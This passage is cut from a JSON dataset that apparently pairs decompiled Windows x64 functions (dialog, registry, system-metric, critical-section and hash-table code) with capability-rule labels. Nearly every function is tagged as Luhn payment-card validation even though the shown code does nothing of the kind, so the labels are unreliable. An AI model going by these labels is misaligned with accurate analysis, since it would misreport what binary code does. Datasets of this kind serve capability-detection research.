            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140013c74(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    \n    fcn.14000b4b4();\n    fcn.14000b468(arg1);\n    iVar2 = (*_sym.imp.USER32.dll_IsWindow)(*(arg1 + 0xd8));\n    if (iVar2 != 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(*(arg1 + 0xd8), 1);\n    }\n    *(arg1 + 0xd8) = 0;\n    iVar1 = fcn.140006c48();\n    if (*(iVar1 + 8) != 0) {\n        fcn.1400113c4(*(iVar1 + 8), 1);\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "140013e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140013e4c(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t hWnd;\n    \n    if (*(arg1 + 200) == 0) {\n        iVar1 = fcn.14000f338(arg1, *(arg1 + 0xb0));\n    }\n    else {\n        iVar1 = fcn.14000ed50(arg1, *(arg1 + 200));\n    }\n    if ((iVar1 != 0) && (iVar1 = fcn.14000aafc(arg1, 0),  iVar1 != 0)) {\n        hWnd = fcn.140007a80(arg1, 0xe146);\n        if (hWnd != 0) {\n            iVar1 = fcn.140013dc4();\n            fcn.140007c14(hWnd, -(iVar1 != 0) & 5);\n        }\n        return 1;\n    }\n    fcn.1400139a8(arg1, 0xffffffff);\n    return 0;\n}\n",
        "token_count": 223
    },
    "14001451": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.140014518(int64_t *arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    int64_t *piVar8;\n    ushort uStackX32;\n    int64_t in_stack_00000028;\n    int64_t iStack128;\n    int64_t iStack120;\n    int64_t *piStack112;\n    uchar auStack104 [24];\n    ulong uStack80;\n    uchar auStack72 [24];\n    ulong uStack48;\n    \n    if (arg3 == 0) {\n        uStack48 = 0x14001453d;\n        piVar8 = fcn.14001276c();\n        if (piVar8 == NULL) {\n            arg3 = 0;\n        }\n        else {\n            uStack48 = 0x14001454f;\n            arg3 = (**(*piVar8 + 0xe8))(piVar8);\n        }\n    }\n    arg1[0x19] = arg4;\n    uStack80 = 0xfffffffffffffffe;\n    iVar7 = 0;\n    if (in_stack_00000028 == 0) {\n        iVar4 = fcn.140006c48();\n        in_stack_00000028 = *(iVar4 + 0x18);\n    }\n    iVar4 = fcn.140006c48();\n    piVar8 = *(iVar4 + 0x68);\n    iStack120 = 0;\n    piStack112 = piVar8;\n    fcn.14000ef38(0x10);\n    fcn.14000ef38(0x3c000);\n    if (piVar8 != NULL) {\n        iVar3 = (**(*arg1 + 0x268))(arg1, &stack0xffffffffffffffb8);\n        if (iVar3 == 0) {\n            return 0;\n        }\n        arg2 = (**(*piVar8 + 0x28))(piVar8, &stack0xffffffffffffffb8, arg2);\n    }\n    if (arg2 == 0) {\n        uVar6 = 0;\n    }\n    else {\n        piVar5 = fcn.14000fd70();\n        if (piVar5 == NULL) {\n            fcn.140001010(0x80004005);\n            pcVar2 = swi(3);\n            uVar6 = (*pcVar2)();\n            return uVar6;\n        }\n        iStack128 = (**(*piVar5 + 0x18))(piVar5);\n        iStack128 = iStack128 + 0x18;\n        uStackX32 = 0;\n        iVar3 = fcn.140018898(arg2, &stack0xffffffffffffff80, &stack0x00000020);\n        iVar4 = iVar7;\n        if (iVar3 == 0) {\n            fcn.14001884c(&stack0xffffffffffffff98, arg2);\n            fcn.140018750(&stack0xffffffffffffff98);\n            iVar4 = fcn.140018320(&stack0xffffffffffffff98);\n            fcn.140018308(&stack0xffffffffffffff98);\n            if (iVar4 != 0) {\n                arg2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar4);\n            }\n        }\n        *(arg1 + 0x11) = 0xffffffff;\n        *(arg1 + 0xf) = *(arg1 + 0xf) | 0x10;\n        fcn.14000d690(arg1);\n        if (arg3 != 0) {\n            iVar7 = *(arg3 + 0x40);\n        }\n        iVar7 = (*_sym.imp.USER32.dll_CreateDialogIndirectParamA)(in_stack_00000028, arg2, iVar7, 0x14001381c, 0);\n        LOCK();\n        piVar1 = iStack128 + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        iStack120 = iVar7;\n        if (iVar3 + -1 < 1) {\n            (**(**(iStack128 + -0x18) + 8))();\n        }\n        if ((piVar8 != NULL) && (iVar7 != 0)) {\n            (**(*piVar8 + 0x30))(piVar8, &stack0xffffffffffffffb8);\n            (**(*arg1 + 0x268))(arg1, 0);\n        }\n        iVar3 = fcn.14000b4b4();\n        if (iVar3 == 0) {\n            (**(*arg1 + 0x238))(arg1);\n        }\n        if ((iVar7 != 0) && ((*(arg1 + 0xf) & 0x10) == 0)) {\n            (*_sym.imp.USER32.dll_DestroyWindow)(iVar7);\n            iVar7 = 0;\n        }\n        if (iVar4 != 0) {\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(iVar4);\n            (*_sym.imp.KERNEL32.dll_GlobalFree)(iVar4);\n        }\n        uVar6 = iVar7 != 0;\n    }\n    return uVar6;\n}\n",
        "token_count": 1178
    },
    "14001467": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14001467c(int64_t arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    \n    fcn.14001ba54(*(arg1 + 0xa8));\n    uVar1 = fcn.14001ccc4(arg2);\n    *(arg1 + 0xa8) = uVar1;\n    fcn.14001ba54(*(arg1 + 0xd0));\n    uVar1 = fcn.14001ccc4(*(arg1 + 0xa0));\n    *(arg1 + 0xd0) = uVar1;\n    return;\n}\n",
        "token_count": 131
    },
    "1400146d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1400146d4(int64_t arg1)\n\n{\n    int32_t iVar1;\n    uchar auStackX16 [8];\n    int64_t iStackX24;\n    int64_t iStackX32;\n    int64_t *piVar2;\n    uint64_t uVar3;\n    ulong auStack24 [2];\n    \n    auStack24[0] = 0;\n    iStackX24 = 0;\n    iStackX32 = 0;\n    piVar2 = &iStackX24;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0xffffffff80000001, \"software\", 0, 0x2001f, piVar2);\n    if (iVar1 == 0) {\n        uVar3 = piVar2 & 0xffffffff00000000;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                          (iStackX24, *(arg1 + 0xa8), 0, 0, uVar3, 0x2001f, 0, &iStackX32, auStackX16);\n        if (iVar1 == 0) {\n            (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                      (iStackX32, *(arg1 + 0xd0), 0, 0, uVar3 & 0xffffffff00000000, 0x2001f, 0, auStack24, auStackX16);\n        }\n    }\n    if (iStackX24 != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n    }\n    if (iStackX32 != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n    }\n    return auStack24[0];\n}\n",
        "token_count": 398
    },
    "1400147d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400147d8(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    uchar auStackX24 [8];\n    int64_t iStackX32;\n    \n    iStackX32 = 0;\n    iVar1 = fcn.1400146d4(arg1);\n    if (iVar1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(iVar1, arg2, 0, 0, 0, 0x2001f, 0, &iStackX32, auStackX24);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n        iVar1 = iStackX32;\n    }\n    return iVar1;\n}\n",
        "token_count": 168
    },
    "14001490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14001490c(int64_t arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int64_t iStackX8;\n    \n    fcn.140007ab8(*(arg1 + 8), arg2, &iStackX8);\n    if ((iStackX8 == 0) && (iVar2 = fcn.140007a58(*(arg1 + 8)),  iVar2 == 0)) {\n        fcn.140005e0c();\n        pcVar1 = swi(3);\n        iVar2 = (*pcVar1)();\n        return iVar2;\n    }\n    *(arg1 + 0x14) = 0;\n    *(arg1 + 0x10) = arg2;\n    return iStackX8;\n}\n",
        "token_count": 180
    },
    "140014a6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140014a64(int64_t arg1, int64_t arg2)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    \n    if (arg1 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        uVar2 = (*pcVar1)();\n        return uVar2;\n    }\n    if (arg2 != 0) {\n        do {\n            if (arg1 == arg2) {\n                return 1;\n            }\n            arg1 = *(arg1 + 0x18);\n        } while (arg1 != 0);\n        return 0;\n    }\n    fcn.140005e30();\n    pcVar1 = swi(3);\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 179
    },
    "140014a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140014a9c(ulong *arg1, int64_t arg2)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    \n    if (arg1 == NULL) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        uVar2 = (*pcVar1)();\n        return uVar2;\n    }\n    iVar3 = (***arg1)();\n    if (iVar3 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        uVar2 = (*pcVar1)();\n        return uVar2;\n    }\n    if (iVar3 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        uVar2 = (*pcVar1)();\n        return uVar2;\n    }\n    if (arg2 != 0) {\n        do {\n            if (iVar3 == arg2) {\n                return 1;\n            }\n            iVar3 = *(iVar3 + 0x18);\n        } while (iVar3 != 0);\n        return 0;\n    }\n    fcn.140005e30();\n    pcVar1 = swi(3);\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 289
    },
    "140014ad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140014ad0(ulong arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    \n    if ((arg2 == 0) || (iVar1 = fcn.140014a9c(arg2, arg1),  iVar1 == 0)) {\n        arg2 = 0;\n    }\n    return arg2;\n}\n",
        "token_count": 82
    },
    "140014d5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.140014d50(ulong arg1, ulong arg2, int64_t *arg3)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.140014b38(arg1, arg2);\n    *arg3 = iVar2;\n    if (iVar2 == 0) {\n        iVar2 = fcn.140014c0c(arg1, arg2);\n        *arg3 = iVar2;\n        uVar1 = ~-(iVar2 != 0) & 0x80004002;\n    }\n    else {\n        fcn.140014c9c(arg1);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 160
    },
    "140014dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140014dc8(int64_t arg1)\n\n{\n    ulong uVar1;\n    uint uVar2;\n    \n    uVar2 = (*_sym.imp.USER32.dll_GetSysColor)(0xf);\n    *(arg1 + 0x30) = uVar2;\n    uVar2 = (*_sym.imp.USER32.dll_GetSysColor)(0x10);\n    *(arg1 + 0x34) = uVar2;\n    uVar2 = (*_sym.imp.USER32.dll_GetSysColor)(0x14);\n    *(arg1 + 0x38) = uVar2;\n    uVar2 = (*_sym.imp.USER32.dll_GetSysColor)(0x12);\n    *(arg1 + 0x3c) = uVar2;\n    uVar2 = (*_sym.imp.USER32.dll_GetSysColor)(6);\n    *(arg1 + 0x40) = uVar2;\n    uVar1 = (*_sym.imp.USER32.dll_GetSysColorBrush)(0xf);\n    *(arg1 + 0x28) = uVar1;\n    uVar1 = (*_sym.imp.USER32.dll_GetSysColorBrush)(6);\n    *(arg1 + 0x20) = uVar1;\n    return;\n}\n",
        "token_count": 273
    },
    "140014e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140014e3c(int64_t arg1)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    \n    uVar1 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0xb);\n    *(arg1 + 8) = uVar1;\n    uVar1 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0xc);\n    *(arg1 + 0xc) = uVar1;\n    *0x140053380 = (*_sym.imp.USER32.dll_GetSystemMetrics)(2);\n    *0x140053380 = *0x140053380 + 1;\n    *0x140053384 = (*_sym.imp.USER32.dll_GetSystemMetrics)(3);\n    *0x140053384 = *0x140053384 + 1;\n    uVar2 = (*_sym.imp.USER32.dll_GetDC)(0);\n    uVar1 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar2, 0x58);\n    *(arg1 + 0x18) = uVar1;\n    uVar1 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar2, 0x5a);\n    *(arg1 + 0x1c) = uVar1;\n    // WARNING: Could not recover jumptable at 0x000140014ec7. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar2);\n    return;\n}\n",
        "token_count": 330
    },
    "140014ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140014ed0(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    fcn.140014e3c(arg1);\n    *(arg1 + 0x28) = 0;\n    fcn.140014dc8(arg1);\n    uVar1 = (*_sym.imp.USER32.dll_LoadCursorA)(0, 0x7f02);\n    *(arg1 + 0x48) = uVar1;\n    uVar1 = (*_sym.imp.USER32.dll_LoadCursorA)(0, 0x7f00);\n    *(arg1 + 0x70) = 0;\n    *(arg1 + 0x58) = 0;\n    *(arg1 + 0x50) = uVar1;\n    *(arg1 + 0x10) = 2;\n    *(arg1 + 0x14) = 2;\n    return arg1;\n}\n",
        "token_count": 204
    },
    "140014f7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140014f70(ulong uBytes)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, uBytes);\n    if (iVar2 == 0) {\n        fcn.140005de8();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "140014fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get thread local storage value"
        ],
        "decompiled_code": "\nulong fcn.140014fa8(uint *lpCriticalSection, ulong arg2)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 10);\n    if ((((0 < arg2) && (arg2 < lpCriticalSection[3])) &&\n        (iVar2 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*lpCriticalSection),  iVar2 != 0)) && (arg2 < *(iVar2 + 0x10))) {\n        uVar1 = *(*(iVar2 + 0x18) + arg2 * 8);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 10);\n        return uVar1;\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 10);\n    return 0;\n}\n",
        "token_count": 186
    },
    "14001501": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140015018(uint32_t *arg1)\n\n{\n    ulong uVar1;\n    \n    if ((*arg1 == 0) || (*0x140053400 == 0)) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.140014fa8(*0x140053400, *arg1);\n    }\n    return uVar1;\n}\n",
        "token_count": 89
    },
    "1400150c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400150c8(int64_t *arg1, int64_t arg2)\n\n{\n    code *pcVar1;\n    \n    if (arg2 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    *(arg2 + arg1[1]) = *arg1;\n    *arg1 = arg2;\n    return;\n}\n",
        "token_count": 99
    },
    "14001535": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.140015350(int64_t lpCriticalSection, ulong arg2)\n\n{\n    uint32_t *puVar1;\n    ulong *puVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    iVar4 = arg2;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 0x28);\n    if ((0 < arg2) && (arg2 < *(lpCriticalSection + 0xc))) {\n        for (iVar3 = *(lpCriticalSection + 0x18); iVar3 != 0; iVar3 = *(iVar3 + 8)) {\n            if (arg2 < *(iVar3 + 0x10)) {\n                puVar2 = *(*(iVar3 + 0x18) + iVar4 * 8);\n                if (puVar2 != NULL) {\n                    (***puVar2)(puVar2, 1);\n                }\n                *(*(iVar3 + 0x18) + iVar4 * 8) = 0;\n            }\n        }\n        puVar1 = *(lpCriticalSection + 0x10) + iVar4 * 0x10;\n        *puVar1 = *puVar1 & 0xfffffffe;\n    }\n    // WARNING: Could not recover jumptable at 0x0001400153e2. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 0x28);\n    return;\n}\n",
        "token_count": 323
    },
    "14001569": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "get thread local storage value"
        ],
        "decompiled_code": "\nvoid fcn.140015690(uint *lpCriticalSection, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection + 10);\n    if (arg3 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*lpCriticalSection);\n        if (iVar2 != 0) {\n            fcn.14001559c(lpCriticalSection, iVar2, arg2);\n        }\n    }\n    else {\n        iVar2 = *(lpCriticalSection + 6);\n        while (iVar2 != 0) {\n            iVar1 = *(iVar2 + 8);\n            fcn.14001559c(lpCriticalSection, iVar2, arg2);\n            iVar2 = iVar1;\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x000140015710. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(lpCriticalSection + 10);\n    return;\n}\n",
        "token_count": 235
    },
    "14001580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140015800(ulong arg1, ulong arg2)\n\n{\n    if (*0x140053400 != 0) {\n        fcn.140015690(*0x140053400, arg1, arg2);\n    }\n    return;\n}\n",
        "token_count": 57
    },
    "1400158d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400158d0(int64_t arg1)\n\n{\n    if (*(arg1 + 8) != 0) {\n        fcn.1400058b4(*(arg1 + 8));\n        *(arg1 + 8) = 0;\n    }\n    *(arg1 + 0x18) = 0;\n    *(arg1 + 0x20) = 0;\n    fcn.140018cfc(*(arg1 + 0x28));\n    *(arg1 + 0x28) = 0;\n    return;\n}\n",
        "token_count": 124
    },
    "14001594": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140015944(int64_t arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    ulong *puVar3;\n    \n    if (arg1 == 0) {\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        uVar2 = (*pcVar1)();\n        return uVar2;\n    }\n    if (*(arg1 + 8) != 0) {\n        for (puVar3 = *(*(arg1 + 8) + ((arg2 >> 4 & 0xffffffff) % *(arg1 + 0x10)) * 8); puVar3 != NULL; puVar3 = *puVar3\n            ) {\n            if (puVar3[1] == arg2) {\n                return puVar3[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 196
    },
    "14001598": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14001598c(ulong arg1, ulong arg2, ulong *arg3)\n\n{\n    int64_t iVar1;\n    uchar auStackX32 [8];\n    uchar auStack24 [24];\n    \n    iVar1 = fcn.14001590c(arg1, arg2, auStack24, auStackX32);\n    if (iVar1 != 0) {\n        *arg3 = *(iVar1 + 0x10);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 116
    },
    "1400159b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1400159b8(int64_t arg1, uint64_t arg2)\n\n{\n    int64_t *piVar1;\n    ulong *puVar2;\n    ulong *puVar3;\n    ulong *puVar4;\n    \n    if (*(arg1 + 8) != 0) {\n        puVar4 = *(arg1 + 8) + ((arg2 >> 4 & 0xffffffff) % *(arg1 + 0x10)) * 8;\n        puVar2 = *puVar4;\n        while (puVar3 = puVar2,  puVar3 != NULL) {\n            if (puVar3[1] == arg2) {\n                *puVar4 = *puVar3;\n                *puVar3 = *(arg1 + 0x20);\n                piVar1 = arg1 + 0x18;\n                *piVar1 = *piVar1 + -1;\n                *(arg1 + 0x20) = puVar3;\n                if (*piVar1 == 0) {\n                    fcn.1400158d0(arg1);\n                }\n                return 1;\n            }\n            puVar4 = puVar3;\n            puVar2 = *puVar3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 278
    },
    "140015a2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140015a20(int64_t arg1, int64_t **arg2, int64_t *arg3, int64_t *arg4)\n\n{\n    code *pcVar1;\n    int64_t **ppiVar2;\n    int64_t *piVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int64_t *piVar6;\n    \n    piVar6 = *arg2;\n    if (piVar6 != NULL) {\n        if ((piVar6 == 0xffffffffffffffff) && (uVar5 = 0,  *(arg1 + 0x10) != 0)) {\n            ppiVar2 = *(arg1 + 8);\n            while (piVar6 = *ppiVar2,  piVar6 == NULL) {\n                uVar5 = uVar5 + 1;\n                ppiVar2 = ppiVar2 + 1;\n                if (*(arg1 + 0x10) <= uVar5) {\n                    fcn.140005e30();\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n            }\n        }\n        piVar3 = *piVar6;\n        if (piVar3 == NULL) {\n            uVar5 = *(arg1 + 0x10);\n            uVar4 = (piVar6[1] >> 4 & 0xffffffff) % uVar5 + 1;\n            if (uVar4 < uVar5) {\n                ppiVar2 = *(arg1 + 8) + uVar4 * 8;\n                do {\n                    piVar3 = *ppiVar2;\n                    if (piVar3 != NULL) break;\n                    uVar4 = uVar4 + 1;\n                    ppiVar2 = ppiVar2 + 1;\n                } while (uVar4 < uVar5);\n            }\n        }\n        *arg2 = piVar3;\n        *arg3 = piVar6[1];\n        *arg4 = piVar6[2];\n    }\n    return;\n}\n",
        "token_count": 451
    },
    "140015c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140015c38(int64_t arg1)\n\n{\n    *(arg1 + 0x18) = 0;\n    *(arg1 + 0x20) = 0;\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 8) = 0;\n    fcn.140018cfc(*(arg1 + 0x28));\n    *(arg1 + 0x28) = 0;\n    return;\n}\n",
        "token_count": 105
    },
    "140015c6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140015c6c(int64_t arg1, ulong *arg2)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    \n    if (arg2 == NULL) {\n        fcn.140005e30();\n        pcVar2 = swi(3);\n        (*pcVar2)();\n        return;\n    }\n    *arg2 = *(arg1 + 0x20);\n    piVar1 = arg1 + 0x18;\n    *piVar1 = *piVar1 + -1;\n    *(arg1 + 0x20) = arg2;\n    if (*piVar1 == 0) {\n        fcn.140015c38(arg1);\n    }\n    return;\n}\n",
        "token_count": 161
    },
    "140015c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140015c98(int64_t arg1)\n\n{\n    int64_t *arg2;\n    int64_t iVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    \n    if (arg1 == 0) {\n        fcn.140005e30();\n        pcVar2 = swi(3);\n        iVar3 = (*pcVar2)();\n        return iVar3;\n    }\n    arg2 = *(arg1 + 8);\n    if (arg2 == NULL) {\n        fcn.140005e30();\n        pcVar2 = swi(3);\n        iVar3 = (*pcVar2)();\n        return iVar3;\n    }\n    iVar3 = *arg2;\n    iVar1 = arg2[2];\n    *(arg1 + 8) = iVar3;\n    if (iVar3 == 0) {\n        *(arg1 + 0x10) = 0;\n    }\n    else {\n        *(iVar3 + 8) = 0;\n    }\n    fcn.140015c6c(arg1, arg2);\n    return iVar1;\n}\n",
        "token_count": 241
    },
    "14001612": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140016124(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140006c98();\n    *(iVar1 + 0x20) = *(iVar1 + 0x20) + 1;\n    return;\n}\n",
        "token_count": 59
    },
    "14001662": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140016620(int64_t arg1)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    \n    if (arg1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GlobalFlags)();\n        uVar2 = uVar1;\n        if (uVar1 != 0) {\n            do {\n                (*_sym.imp.KERNEL32.dll_GlobalUnlock)(arg1);\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(arg1);\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "140016ee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.140016eec(void)\n\n{\n    if (*0x140053474 == 0) {\n        *0x140053474 = 1;\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x140053728);\n    }\n    return *0x140053474;\n}\n",
        "token_count": 68
    },
    "14001706": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140017064(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140006c48();\n    LOCK();\n    *(iVar1 + 0x50) = *(iVar1 + 0x50) + 1;\n    return;\n}\n",
        "token_count": 62
    },
    "14001707": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.140017078(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140006c48();\n    return *(iVar1 + 0x54);\n}\n",
        "token_count": 43
    },
    "1400170f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400170f0(void)\n\n{\n    int32_t *piVar1;\n    int64_t iVar2;\n    \n    iVar2 = fcn.140006c48();\n    LOCK();\n    piVar1 = iVar2 + 0x50;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        fcn.14001708c();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "14001755": {
        "rules": [
